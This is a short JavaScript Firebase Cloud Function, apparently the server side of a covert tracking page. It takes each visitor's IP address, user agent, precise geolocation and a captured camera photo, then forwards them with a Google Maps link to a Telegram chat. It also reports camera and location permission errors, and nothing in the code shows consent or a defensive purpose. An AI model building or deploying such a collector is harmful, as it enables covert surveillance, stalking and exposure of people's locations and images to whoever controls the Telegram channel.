const functions = require('firebase-functions');
const { sendMessage, sendPhoto, sendLocation } = require('./telegram');

exports.collectData = functions.https.onRequest(async (req, res) => {
    const payload = req.body || {};
    const ip = req.ip;
    const ua = req.get('User-Agent') || '';
    const timestamp = new Date().toISOString();

    let text = `🕒 ${timestamp}\n\n🌐 IP: ${ip}\n📱 UA: ${ua}`;

    // Send Text Summary first
    if (payload.location) {
        const { lat, lng, acc } = payload.location;
        const gmapsLink = `https://maps.google.com/?q=${lat},${lng}`;
        text += `\n\n📍 Location: ${JSON.stringify(payload.location)}`;
        text += `\n🔗 Maps: ${gmapsLink}`;
    }

    // Add Error diagnostics
    if (payload.locationError) {
        text += `\n\n❌ Location Error: ${payload.locationError}`;
    }
    if (payload.cameraError) {
        text += `\n❌ Camera Error: ${payload.cameraError}`;
    }
    await sendMessage(text);

    // Send Rich Location (Map Preview)
    if (payload.location) {
        await sendLocation(payload.location.lat, payload.location.lng);
    }

    // Send Photo
    if (payload.photoUrl) {
        await sendPhoto(payload.photoUrl, '📸 Captured image');
    }

    res.status(200).send('OK');
});
